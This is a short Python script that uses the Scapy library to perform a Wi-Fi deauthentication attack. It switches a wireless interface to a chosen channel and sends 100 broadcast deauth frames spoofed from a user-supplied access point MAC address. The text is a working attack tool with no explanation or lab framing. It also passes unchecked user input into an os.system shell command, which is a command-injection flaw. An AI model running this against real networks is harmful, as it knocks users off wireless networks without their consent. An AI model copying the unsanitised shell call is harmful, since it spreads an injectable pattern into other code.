from scapy.all import * 
import os

interface = "wlx000c097012bf"

BSSID = input("Enter the MAC of AP ")
victim_mac = "FF:FF:FF:FF:FF:FF"
ch = input("Enter the channel number ")

cmd = "iwconfig "+interface+" channel "+ch
os.system(cmd)

frame1 = RadioTap()/Dot11(addr1=victim_mac,addr2=BSSID, addr3= BSSID)/Dot11Deauth()

sendp(frame1,iface=interface,count = 100,inter=.2)
